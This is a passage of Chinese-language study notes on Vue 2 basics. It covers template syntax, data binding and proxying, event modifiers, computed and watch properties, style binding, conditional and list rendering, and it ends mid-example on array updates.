# Vue

## 第1章 Vue基本用法

### 1.1 基础理论

#### 1.1.1 MVVM模型

1. M：模型(Model) ：data中的数据
2. V：视图(View) ：模板代码，vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用
3. VM：视图模型(ViewModel)：Vue实例，data中所有的属性，最后都出现在了vm身上

#### 1.1.2 Vue重要原则

1. 被Vue管理的函数，最好写成普通函数（不要写成箭头函数），这样this的指向才是 vm 或 组件实例对象
2. 不被Vue所管理的函数（定时器、ajax、Promise等），最好写成箭头函数，这样this的指向才是 vm 或 组件实例对象

#### 1.1.3 Vue基本结构

1. 引入Vue：`<script type="text/javascript" src="../js/vue.js"></script>`

   ```html
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
   ```

2. 准备容器：`<div id="root">`

3. 阻止提示：`Vue.config.productionTip = false`

4. 创建实例：

   1）el（element缩写）：指定当前Vue实例为哪个容器服务

   * 写法1：`el: '#root'`
   * 写法2：`const v = new Vue(...), v.$mount('#root')`

   ```js
   //el的两种写法
   const v = new Vue({
   	el:'#root', // 第一种写法
   	data:{
   		name:'尚硅谷'
   	}
   })
   
   v.$mount('#root') // 第二种写法
   ```

   2）data：存储数据，数据供el所指定的容器去使用

   * 写法1：对象型：`data: { name:'尚硅谷' }`
   * 写法2：函数型（脚手架必用）：`data() { return { name:'尚硅谷', }}`

   ```js
   //data的两种写法
   new Vue({
     el: '#root',
     // 第一种写法：对象式
     data:{
   		name:'尚硅谷'
   	}
     // 第二种写法：函数式
     data() {
       console.log('@@@', this) //此处的this是Vue实例对象
       return {
         name: '尚硅谷',
       }
     },
   })
   ```

5. 完整的HTML单页写法：

   ```html
   <!-- 引入vue.js -->
   <script type="text/javascript" src="../js/vue.js"></script>
   <!-- 准备好一个容器 -->
   <div id="demo">
     <h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
   </div>
   <script type="text/javascript">
     Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
     //创建Vue实例
     new Vue({
       el: '#demo', //el（element缩写）用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
       data: {
         //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
         name: 'atguigu',
         address: '北京',
       },
     })
   </script>
   ```

#### 1.1.4 模板语法

1. 插值语法：`{{xxx}}`，用于解析标签体内容，里面要写js表达式

2. 指令语法：用于解析标签（包括：标签属性、标签体内容、绑定事件等）

   * 语法：`v-bind`、`v-model`、`v-for`、`v-text`等等

   ```html
   <div id="root">
     <h1>插值语法</h1>
     <h3>你好，{{name}}</h3>
     <hr />
     <h1>指令语法</h1>
     <a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
     <a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: 'jack',
       school: {
         name: '尚硅谷',
         url: 'http://www.atguigu.com',
       },
     },
   })
   ```

3. 注意：js表达式和js语句的区别

   1）js表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方

   ```js
   a
   a+b
   demo(1)
   x === y ? 'a' : 'b'
   ```

   2）js语句：`if(){}`、`for(){}`

------

### 1.2 数据绑定与代理

#### 1.2.1 数据绑定 v-bind/model

1. 单向绑定(`v-bind`)：数据只能从data流向页面

   ```html
   <input type="text" :value="name" />
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
     },
   })
   ```

2. 双向绑定(`v-model`)：数据不仅能从data流向页面，还可以从页面流向data

   1）一般都应用在表单类元素上（如：input、select等）

   2）`v-model:value` 可以简写为 v-model，因为v-model默认收集的就是value值

   ```html
   <input type="text" v-model="name" />
   ```

   3）注意：v-model绑定的值不能是`props`传过来的值，因为`props`是不可以修改的！

3. `v-model`的三个修饰符：

   1）`lazy`：失去焦点再收集数据，适合用于文本框textarea

   ```html
   <textarea v-model.lazy="userInfo.other"></textarea>
   ```

   2）`number`：输入字符串转为有效的数字

   ```html
   年龄：<input type="number" v-model.number="userInfo.age" />
   ```

   3）`trim`：输入首尾空格过滤

   ```html
   账号：<input type="text" v-model.trim="userInfo.account" />
   ```

#### 1.2.2 数据代理

##### 1.2.2.1 原JS的数据代理

1. 语法：`Object.defineProperty (obj, prop, descriptor )`

2. descriptor说明：以对象的形式书写，对于obj初始时内部定义的属性，descriptor中后三项默认都是true

   1）`value`：设置属性值，默认为undefined

   2）`writable`: 布尔值，值是否可以重写，默认为false

   3）`enumerable`: 布尔值，目标属性是否可以被枚举，默认为 false，即Object.keys()是否可以遍历出该属性

   4）`configurable`：布尔值，目标属性是否可以被删除或是否可以再次修改特性，默认为false

3. `get函数(getter)`：当有人读取对象的新增属性时，get函数(getter)就会被调用，且返回值就是新增属性的值

4. `set函数(setter)`：当有人修改对象的新增属性时，set函数(setter)就会被调用，且会收到修改的具体值

   ```js
   let number = 18
   let person = {
     name: '张三',
     sex: '男',
   }
   Object.defineProperty(person, 'age', {
     get() {
       console.log('有人读取age属性了')
       return number
     },
     // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
     set(value) {
       console.log('有人修改了age属性，且值是', value)
       number = value
     },
   })
   ```

##### 1.2.2.2 Vue的数据代理

1. 目的：通过vm对象来代理data对象中属性的操作（读/写）

2. 原理：

   1）通过`Object.defineProperty()`把data对象中所有属性添加到`vm`上

   2）为每一个添加到vm上的属性，都指定一个getter/setter

   3）在getter/setter内部去操作（读/写）data中对应的属性
   
   ```html
   <div id="root">
     <h2>学校名称：{{name}}</h2>
     <h2>学校地址：{{address}}</h2>
   </div>
   ```
   
   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       address: '宏福科技园',
     },
   })
   ```

------

### 1.3 事件处理 methods

#### 1.3.1 基本用法 v-on/@

1. 语法：

   1）HTML标签：用`v-on:xxx` 或 `@xxx` 绑定事件，其中xxx是事件名

   2）Vue实例：配置在methods对象中，最终会在vm上

2. 注意：

   1）methods中配置的函数，不要用箭头函数！否则this就不是vm了

   2）methods中配置的函数，都是被Vue所管理的函数，this 的指向是vm 或 组件实例对象

   3）`@click="demo"` 和 `@click="demo($event)"` 效果一致，但后者可以传参

3. 事件对象：`$event`

   1）等同于原生JS函数参数中的`event`

   2）常用：`e.target.value`，取input输入框中的值

   ```html
   <body>
     <div id="root">
       <h2>欢迎来到{{name}}学习</h2>
       <!-- <button v-on:click="showInfo">点我提示信息</button> -->
       <button @click="showInfo1">点我提示信息1（不传参）</button>
       <!-- 如果需要传参，可以用$event保留函数中的event对象 -->
       <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
     </div>
   </body>
   <script type="text/javascript">
     Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示
     const vm = new Vue({
       el: '#root',
       data: {
         name: '尚硅谷',
       },
       // 固定写法：methods
       methods: {
         showInfo1(event) {
           // console.log(event.target.innerText)
           // console.log(this) //此处的this是vm
           alert('同学你好！')
         },
         showInfo2(event, number) {
           console.log(event, number)
           // console.log(event.target.innerText)
           // console.log(this) //此处的this是vm
           alert('同学你好！！')
         },
       },
     })
   </script>
   ```

#### 1.3.2 事件修饰符

1. `prevent`：阻止默认事件（常用）

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
     },
     methods: {
       showInfo(e) {
         alert('同学你好！')
         // console.log(e.target)
       },
       showMsg(msg) {
         console.log(msg)
       },
       demo() {
         for (let i = 0; i < 100000; i++) {
           console.log('#')
         }
         console.log('累坏了')
       },
     },
   })
   ```

   ```html
   <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>
   ```

2. `stop`：阻止事件冒泡（常用）

   ```html
   <div class="demo1" @click="showInfo">
     <button @click.stop="showInfo">点我提示信息</button>
     <!-- 修饰符可以连续写 -->
     <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a>
   </div>
   ```

3. `once`：事件只触发一次（常用）

   ```html
   <button @click.once="showInfo">点我提示信息</button>
   ```

4. `capture`：使用事件的捕获模式

   ```html
   <div class="box1" @click.capture="showMsg(1)">
     div1
     <div class="box2" @click="showMsg(2)">div2</div>
   </div>
   ```

5. `self`：只有event.target是当前操作的元素时才触发事件（与阻止冒泡stop相同）

   ```html
   <div class="demo1" @click.self="showInfo">
     <button @click="showInfo">点我提示信息</button>
   </div>
   ```

6. `passive`：事件的默认行为立即执行，无需等待事件回调执行完毕

   ```html
   <!-- 事件：scroll：滚动条，鼠标和键盘都可以操作；wheel：只有鼠标滚轮才能操作 -->
   <!-- 效果：如果不加passive，会等待demo函数计算完毕后，滚动条才会移动，加上passive可以不用等demo计算完，滚动条便可以移动 -->
   <!-- 注意：也并非所有动作都收到passive的影响，scroll不加passive也一样优先被滚动 -->
   <!-- <ul @wheel="demo" class="list"> -->
   <ul @wheel.passive="demo" class="list">
     <li>1</li>
     <li>2</li>
     <li>3</li>
     <li>4</li>
   </ul>
   ```

#### 1.3.3 键盘事件

1. 按键别名：

   1）回车 => `enter`

   2）删除 => `delete` (捕获“删除”和“退格”键)

   3）退出 => `esc`

   4）空格 => `space`

   5）换行 => `tab` (特殊，必须配合keydown去使用)

   6）上 => `up`

   7）下 => `down`

   8）左 => `left`

   9）右 => `right`

2. 未提供别名的按键:

   1）方法1：用按键原始的key值去绑定，但要转为kebab-case，例：CapsLock要写成`caps-lock`

   ```html
   <input type="text" placeholder="按下CapsLock提示输入" @keydown.caps-lock="showInfo" />
   ```

   2）方法2：`Vue.config.keyCodes.自定义键名 = 键码`

   ```js
   Vue.config.keyCodes.huiche = 13
   ```

   3）废除方法：使用键码指定按键，如 @keydown.13

3. 系统修饰键：

   1）按键：ctrl、alt、shift、meta

   2）配合`keyup`：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发

   ```html
   <!-- 系统修饰键盘如果配合keyup使用，可以在后面加一个按键，指定需要同时按下的键，如果不指定，配合任何按键同时按下均可 -->
   <input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo" />
   ```

   3）配合`keydown`：正常触发事件

   ```html
   <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo" />
   ```

4. 案例完整代码：

   ```html
   <div id="root">
     <h2>欢迎来到{{name}}学习</h2>
     <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo" />
     <!-- 系统修饰键盘如果配合keyup使用，可以在后面加一个按键，指定需要同时按下的键，如果不指定，配合任何按键同时按下均可 -->
     <input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo" />
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
     },
     methods: {
       showInfo(e) {
         // e.key：按键名称；e.keyCode：按键编码
         // console.log(e.key, e.keyCode)
         console.log(e.target.value)
       },
     },
   })
   ```

------

### 1.4 计算属性 computed

1. 定义：要用的属性不存在，要通过已有属性计算得来

2. 与method区别：

   1）内部有缓存机制（复用），效率更高、调试方便

   2）如果多次调用，无需多次get，直接读取缓存，除非数据发生了变化，再重新get一次

   ```html
   <!-- method实现 -->
   <div id="root">
     姓：<input type="text" v-model="firstName" /> <br /><br />
     名：<input type="text" v-model="lastName" /> <br /><br />
     全名：<span>{{fullName()}}</span>
   </div>
   <script type="text/javascript">
     Vue.config.productionTip = false
     new Vue({
       el: '#root',
       data: {
         firstName: '张',
         lastName: '三',
       },
       methods: {
         // 只要vue中的数据发生改变，就会重新调用该函数，重新解析模板
         fullName() {
           console.log('@---fullName')
           return this.firstName + '-' + this.lastName
         },
       },
     })
   </script>
   ```

   ```html
   <!-- computed实现 -->
   <div id="root">
     姓：<input type="text" v-model="firstName" /> <br /><br />
     名：<input type="text" v-model="lastName" /> <br /><br />
     测试：<input type="text" v-model="x" /> <br /><br />
     全名：<span>{{fullName}}</span> <br /><br />
   </div>
   <script type="text/javascript">
     Vue.config.productionTip = false
     const vm = new Vue({
       el: '#root',
       data: {
         firstName: '张',
         lastName: '三',
         x: '你好',
       },
       methods: {
         demo() {},
       },
       // 计算属性
       computed: {
         fullName: {
           // get作用：当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
           // get调用：1.初次读取fullName时。2.所依赖的数据发生变化时。
           get() {
             console.log('get被调用了')
             // console.log(this) //此处的this是vm
             return this.firstName + '-' + this.lastName
           },
           // set调用：当fullName被修改时
           // set不是必须要写的，除非存在fullName有被修改的需求
           set(value) {
             console.log('set', value)
             const arr = value.split('-')
             this.firstName = arr[0]
             this.lastName = arr[1]
           },
         },
       },
     })
   </script>
   ```

3. 原理：底层借助了`Objcet.defineproperty`方法提供的`getter`和`setter`
   * get函数执行时间：初次读取时会执行一次，当依赖的数据发生改变时会被再次调用

4. 注意：

   1）计算属性最终会出现在vm上，直接读取使用即可

   2）如果计算属性要被修改，必须写`set`函数去响应修改，且`set`中要引起计算时依赖的数据发生改变

   3）允许套娃：在计算属性中下方定义的属性可以利用上方定义的属性进行计算

5. 简写：只写`get`，但只读不改

   ```js
   computed: {
     //完整写法
     fullName: {
       get() {
         console.log('get被调用了')
         return this.firstName + '-' + this.lastName
       },
       set(value) {
         console.log('set', value)
         const arr = value.split('-')
         this.firstName = arr[0]
         this.lastName = arr[1]
       },
     },
   },
   ```

   ```js
   computed: {
     //简写（只读不改）
     fullName() {
       console.log('get被调用了')
       return this.firstName + '-' + this.lastName
     },
   },
   ```

------

### 1.5 监视属性 watch

1. 定义：当被监视的属性变化时, 回调函数自动调用, 进行相关操作（监视的属性必须存在，才能进行监视！）

2. 写法：

   1）new Vue时传入watch配置

   ```html
   <div id="root">
     <h2>今天天气很{{info}}</h2>
     <button @click="changeWeather">切换天气</button>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       isHot: true,
     },
     computed: {
       info() {
         return this.isHot ? '炎热' : '凉爽'
       },
     },
     methods: {
       changeWeather() {
         this.isHot = !this.isHot
       },
     },
     // 监视属性
     watch: {
       isHot: {
         immediate: true,
         handler(newValue, oldValue) {
           console.log('isHot被修改了', newValue, oldValue)
         },
       },
     },
   })
   // 必须创建实例才能用
   vm.$watch('isHot', {
     immediate: true, //初始化时让handler调用一下
     //handler什么时候调用？当isHot发生改变时。
     handler(newValue, oldValue) {
       console.log('isHot被修改了', newValue, oldValue)
     },
   })
   ```

   2）通过vm.$watch监视

   ```html
   <div id="root">
     <h2>今天天气很{{info}}</h2>
     <button @click="changeWeather">切换天气</button>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       isHot: true,
     },
     computed: {
       info() {
         return this.isHot ? '炎热' : '凉爽'
       },
     },
     methods: {
       changeWeather() {
         this.isHot = !this.isHot
       },
     },
   // 监视属性
   vm.$watch('isHot', {
     immediate: true,
     handler(newValue, oldValue) {
       console.log('isHot被修改了', newValue, oldValue)
     },
   })
   ```

3. 参数：

   1）`immediate`：布尔值，默认false，初始化时是否让handler调用一下

   2）`handler(newValue,oldValue){...}`：回调函数，当监视的属性改变时被调用

   3）`deep`: true，深度监视模式，注意：如果不用deep，也可以单写 obj.attr，但很麻烦

   ```html
   <div id="root">
     <h2>今天天气很{{info}}</h2>
     <button @click="changeWeather">切换天气</button>
     <hr />
     <h3>a的值是:{{numbers.a}}</h3>
     <button @click="numbers.a++">点我让a+1</button>
     <h3>b的值是:{{numbers.b}}</h3>
     <button @click="numbers.b++">点我让b+1</button>
     <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
     {{numbers.c.d.e}}
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       isHot: true,
       numbers: {
         a: 1,
         b: 1,
         c: {
           d: {
             e: 100,
           },
         },
       },
     },
     computed: {
       info() {
         return this.isHot ? '炎热' : '凉爽'
       },
     },
     methods: {
       changeWeather() {
         this.isHot = !this.isHot
       },
     },
     watch: {
       isHot: {
         handler(newValue, oldValue) {
           console.log('isHot被修改了', newValue, oldValue)
         },
       },
       // 监视多级结构中某个属性的变化（勿忘外面加引号，这样写太麻烦）
       /* 'numbers.a':{
   			handler(){
   				console.log('a被改变了')
   			}
   		} */
       // 监视多级结构中所有属性的变化
       numbers: {
         deep: true,
         handler() {
           console.log('numbers改变了')
         },
       },
     },
   })
   ```

4. 简写：`attibute(newValue, oldValue){...}`，注意：无法配置`immediate`、`deep`等参数

   ```js
   // 写法1
   watch: {
     isHot(newValue,oldValue){
       console.log('isHot被修改了',newValue,oldValue,this)
     }
   },
   
   // 写法2
   vm.$watch('isHot',(newValue,oldValue)=>{
   	console.log('isHot被修改了',newValue,oldValue,this)
   })
   ```

5. 与computed区别：

   1）computed能完成的功能，watch都可以完成

   2）watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

   ```html
   <div id="root">
     姓：<input type="text" v-model="firstName" /> <br /><br />
     名：<input type="text" v-model="lastName" /> <br /><br />
     全名：<span>{{fullName}}</span> <br /><br />
   </div>
   ```
   
   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       firstName: '张',
       lastName: '三',
       fullName: '张-三',
     },
     watch: {
       // 监视firstName
       firstName(val) {
         // 改变姓时，延迟一秒再改变全名，这个用compute无法实现
         // 这里定时器之所以可用箭头函数，因为定时器不是vue管理的，而是js引擎调用的
         setTimeout(() => {
           console.log(this) // 必须使用箭头函数，this才能指向vue，否则指向windows了
           this.fullName = val + '-' + this.lastName
         }, 1000)
       },
       // 监视lastName
       lastName(val) {
         this.fullName = this.firstName + '-' + val
       },
     },
   })
   ```

------

### 1.6 绑定样式

#### 1.6.1 class样式

1. 字符串写法：`:class="mood"`，类名不确定，要动态获取

   ```html
   <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
   ```

   ```js
   // vue
   methods: {
     changeMood() {
       const arr = ['happy', 'sad', 'normal']
       const index = Math.floor(Math.random() * 3)
       this.mood = arr[index]
     },
   },
   ```

   ```css
   /* css */
   .happy {
     border: 4px solid red;
     background-color: rgba(255, 255, 0, 0.644);
     background: linear-gradient(30deg, yellow, pink, orange, yellow);
   }
   
   .sad {
     border: 4px dashed rgb(2, 197, 2);
     background-color: gray;
   }
   
   .normal {
     background-color: skyblue;
   }
   ```

2. 数组写法：`:class="classArr"`，要绑定多个样式，个数不确定，名字也不确定

   ```html
   <div class="basic" :class="classArr">{{name}}</div>
   ```

   ```js
   data: {
     classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
   },
   ```

   ```css
   .atguigu1 {
     background-color: yellowgreen;
   }
   .atguigu2 {
     font-size: 30px;
     text-shadow: 2px 2px 10px red;
   }
   .atguigu3 {
     border-radius: 20px;
   }
   ```

3. 对象写法：`:class="classObj"`，要绑定多个样式，个数确定，名字也确定，但不确定用不用

   ```html
   <div class="basic" :class="classObj">{{name}}</div>
   ```

   ```js
   data: {
     classObj: {
       atguigu1: false,
       atguigu2: false,
       atguigu3: true,
     },
   },
   ```

   ```css
   .atguigu1 {
     background-color: yellowgreen;
   }
   .atguigu2 {
     font-size: 30px;
     text-shadow: 2px 2px 10px red;
   }
   .atguigu3 {
     border-radius: 20px;
   }
   ```

#### 1.6.2 style样式

1. 对象写法：`:style="styleObj"`

   ```html
   <div class="basic" :style="styleObj">{{name}}</div>
   ```

   ```js
   data: {
     styleObj: {
       fontSize: '40px',
       color: 'red',
     },
   },
   ```
   
2. 数组写法：`:style="styleArr"`

   ```html
   <!--等同于：<div class="basic" :style="[styleObj,styleObj2]">{{name}}</div>）-->
   <div class="basic" :style="styleArr">{{name}}</div>
   ```
   
   ```js
   data: {
     styleArr: [
       {
         fontSize: '40px',
         color: 'red',
       },
       {
         backgroundColor: 'orange',
       },
     ],
   },
   ```

------

### 1.7 条件渲染 v-if/show

#### 1.7.1 v-if

> v-if 适用：切换频率较低的场景，不展示的DOM元素直接被移除

1. 写法：

   1）`v-if="表达式"`

   2）`v-else-if="表达式"`

   3）`v-else="表达式"`

2. 注意：v-if 可以和 v-else-if、v-else一起使用，但要求结构不能被“打断”

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       n: 0,
     },
   })
   ```

   ```html
   <h2>当前的n值是:{{n}}</h2>
   <button @click="n++">点我n+1</button>
   <!-- 使用v-if做条件渲染(不展示的DOM元素直接被移除) -->
   <h2 v-if="false">欢迎来到{{name}}，DOM元素已经被移除</h2>
   <h2 v-if="1 === 1">欢迎来到{{name}}</h2>
   <div v-if="n === 1">Angular</div>
   <!-- v-else和v-else-if -->
   <div v-else-if="n === 2">React</div>
   <div v-else-if="n === 3">Vue</div>
   <div v-else>超出范围了……</div>
   <!-- template只能与v-if配合使用 -->
   <template v-if="n === 1">
     <h2>你好</h2>
     <h2>尚硅谷</h2>
     <h2>北京</h2>
   </template>
   ```

#### 1.7.2 v-show

> v-show 适用：切换频率较高的场景，不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

1. 写法：`v-show="表达式"`

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       n: 0,
     },
   })
   ```

   ```html
   <h2>当前的n值是:{{n}}</h2>
   <button @click="n++">点我n+1</button>
   <h2 v-show="false">欢迎来到{{name}}，但是用样式隐藏了</h2>
   <h2 v-show="1 === 1">欢迎来到{{name}}，你能看见这条</h2>
   ```

------

### 1.8 列表渲染 v-for

#### 1.8.1 v-for

> v-for 作用：展示列表数据

1. 语法：`v-for="(item, index) in xxx" :key="yyy"`

   1）key：将每个数据绑定唯一标识

   2）index：默认生成的索引值，从0开始

2. 可遍历：

   ```js
   new Vue({
     el: '#root',
     data: {
       persons: [
         { id: '001', name: '张三', age: 18 },
         { id: '002', name: '李四', age: 19 },
         { id: '003', name: '王五', age: 20 },
       ],
       car: {
         name: '奥迪A8',
         price: '70万',
         color: '黑色',
       },
       str: 'hello',
     },
   })
   ```

   1）数组

   ```html
   <ul>
   	<!-- key的意思是将每个数据绑定唯一标识，绑定的内容保证每项都是不同的即可 -->
   	<!-- index是默认生成的索引值，从0开始 -->
   	<li v-for="(item, index) of persons" :key="index">
   		{{item.name}}-{{item.age}}-{{index}}
   	</li>
   </ul>
   ```

   2）对象

   ```html
   <ul>
   	<li v-for="(value, key) of car" :key="key">
   		{{key}}-{{value}}
   	</li>
   </ul>
   ```

   3）字符串

   ```html
   <ul>
   	<li v-for="(char, index) of str" :key="index">
   		{{char}}-{{index}}
   	</li>
   </ul>
   ```

   4）指定次数

   ```html
   <ul>
   	<li v-for="(number, index) of 5" :key="index">
   		{{index}}-{{number}}
   	</li>
   </ul>
   ```

#### 1.8.2 key的内部原理

1. 虚拟DOM中key的作用：key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较

2. 对比规则：

   1）旧虚拟DOM中找到了与新虚拟DOM相同的key：

   * 若虚拟DOM中内容没变, 直接使用之前的真实DOM
   * 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM

   2）旧虚拟DOM中未找到与新虚拟DOM相同的key：创建新的真实DOM，随后渲染到到页面

3. 用index作为key可能会引发的问题：

   1）对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低

   2）如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题

4. 开发中如何选择key：

   1）最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值

   2）如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，可使用index作为key

   ```html
   <div id="root">
     <!-- 遍历数组 -->
     <h2>人员列表（遍历数组）</h2>
     <button @click.once="add">添加一个老刘</button>
     <ul>
       <!-- key在DOM中看不到，因为被Vue内部使用了 -->
       
       <!-- 错误写法：这样会导致新增用户后面的输入框内容不随数据移动 -->
       <!-- <li v-for="(p, index) of persons" :key="index"> -->
         
       <!-- 正确写法：每条数据单独对应的id可以保证输入框的key跟随数据移动 -->
       <li v-for="(p, index) of persons" :key="p.id">
         {{p.name}}-{{p.age}}
         <input type="text" />
       </li>
     </ul>
   </div>
   
   <script type="text/javascript">
     Vue.config.productionTip = false
     new Vue({
       el: '#root',
       data: {
         persons: [
           { id: '001', name: '张三', age: 18 },
           { id: '002', name: '李四', age: 19 },
           { id: '003', name: '王五', age: 20 },
         ],
       },
       methods: {
         add() {
           const p = { id: '004', name: '老刘', age: 40 }
           // unshift：插入数组最前面
           this.persons.unshift(p)
         },
       },
     })
   </script>
   ```

#### 1.8.3 列表过滤 filter

1. 语法：`arr.filter(callback(element[,index[,array]]))`，返回一个新数组，不会改变原数组

   1）callback：用来测试数组的每个元素的函数；返回 true 表示该元素通过测试，保留该元素，false 则不保留

   2）element：数组中当前正在处理的元素

   3）index(可选)：正在处理的元素在数组中的索引

   4）array(可选)：调用了 filter 的数组本身

2. 案例：按名称筛选人员列表

   ```html
   <div id="root">
   	<h2>人员列表</h2>
   	<input type="text" placeholder="请输入名字" v-model="keyWord">
   	<ul>
   		<li v-for="(p,index) of filPerons" :key="index">
   			{{p.name}}-{{p.age}}-{{p.sex}}
   		</li>
   	</ul>
   </div>
   ```

   1）用watch实现：`handler(val) ==> indexOf(val)`

   ```js
   new Vue({
   	el:'#root',
   	data:{
   		keyWord:'',
   		persons:[
   			{id:'001',name:'马冬梅',age:19,sex:'女'},
   			{id:'002',name:'周冬雨',age:20,sex:'女'},
   			{id:'003',name:'周杰伦',age:21,sex:'男'},
   			{id:'004',name:'温兆伦',age:22,sex:'男'}
   		],
   		filPerons:[]
   	},
   	watch:{
   		keyWord:{
   			immediate:true,
   			handler(val){
   				this.filPerons = this.persons.filter((p)=>{
   					// 注意：所有字符串中都包含空字符串''，且索引值在第0位
   					return p.name.indexOf(val) !== -1
   				})
   			}
   		}
   	}
   })
   ```

   2）用computed实现：`indexOf(this.keyword)`

   ```js
   new Vue({
   	el:'#root',
   	data:{
   		keyWord:'',
   		persons:[
   			{id:'001',name:'马冬梅',age:19,sex:'女'},
   			{id:'002',name:'周冬雨',age:20,sex:'女'},
   			{id:'003',name:'周杰伦',age:21,sex:'男'},
   			{id:'004',name:'温兆伦',age:22,sex:'男'}
   		]
   	},
   	computed:{
   		filPerons(){
   			return this.persons.filter((p)=>{
                   // 注意：所有字符串中都包含空字符串''，且索引值在第0位
   				return p.name.indexOf(this.keyWord) !== -1
   			})
   		}
   	}
   }) 
   ```

#### 1.8.4 列表排序 sort

1. 语法：`arr.sort((firstItem, secondItem) => firstItem.attr - secondItem.attr)`

2. 如果是带筛选功能，一定要先筛选，再排序

   ```html
   <div id="root">
   	<h2>人员列表</h2>
   	<input type="text" placeholder="请输入名字" v-model="keyWord">
   	<button @click="sortType = 2">年龄升序</button>
   	<button @click="sortType = 1">年龄降序</button>
   	<button @click="sortType = 0">原顺序</button>
   	<ul>
   		<li v-for="(p,index) of filPerons" :key="p.id">
   			{{p.name}}-{{p.age}}-{{p.sex}}
   			<input type="text">
   		</li>
   	</ul>
   </div>
   ```

   ```js
   <script type="text/javascript">
   	Vue.config.productionTip = false
   	new Vue({
   		el:'#root',
   		data:{
   			keyWord:'',
   			sortType:0, //0:原顺序 1:降序 2:升序
   			persons:[
   				{id:'001',name:'马冬梅',age:30,sex:'女'},
   				{id:'002',name:'周冬雨',age:31,sex:'女'},
   				{id:'003',name:'周杰伦',age:18,sex:'男'},
   				{id:'004',name:'温兆伦',age:19,sex:'男'}
   			]
   		},
   		computed:{
   			filPerons(){
   				// 注意：先筛选，后排序，必须对筛选后的结果进行排序，所以不能直接返回结果，而要把筛选后结果暂存在arr里
   				const arr = this.persons.filter((p)=>{
   					return p.name.indexOf(this.keyWord) !== -1
   				})
   				//判断一下是否需要排序
   				if(this.sortType){
   					// p1, p2 代表：firstItem, secondItem
   					arr.sort((p1,p2)=>{
   						return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
   					})
   				}
   				return arr
   			}
   		}
   	}) 
   </script>
   ```

#### 1.8.5 列表更新 $set

1. 修改Obj格式的数据

   1）用索引修改数组中的对象的属性，Vue可以识别，例：`this.persons[0].name = '马老师'`

   2）直接修改其中一整条对象数据会导致DOM被修改但Vue不渲染页面

   * 无效方法：用索引直接修改

     ```js
     this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'}
     ```

   * 解决方案：splice

     ```js
     this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
     ```

   3）完整案例代码

   ```html
   <div id="root">
   	<h2>人员列表</h2>
   	<button @click="updateMei">更新马冬梅的信息</button>
   	<ul>
   		<li v-for="(p,index) of persons" :key="p.id">
   			{{p.name}}-{{p.age}}-{{p.sex}}
   		</li>
   	</ul>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
   	el:'#root',
   	data:{
   		persons:[
   			{id:'001',name:'马冬梅',age:30,sex:'女'},
   			{id:'002',name:'周冬雨',age:31,sex:'女'},
   			{id:'003',name:'周杰伦',age:18,sex:'男'},
   			{id:'004',name:'温兆伦',age:19,sex:'男'}
   		]
   	},
   	methods: {
   		updateMei(){
               // 方法1：用索引修改数组中的对象的属性
   			// this.persons[0].name = '马老师' //奏效
   			// this.persons[0].age = 50 //奏效
   			// this.persons[0].sex = '男' //奏效
               
               // 无效方法：用索引直接修改一整条对象
   			// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 
               
               // 方法2：splice
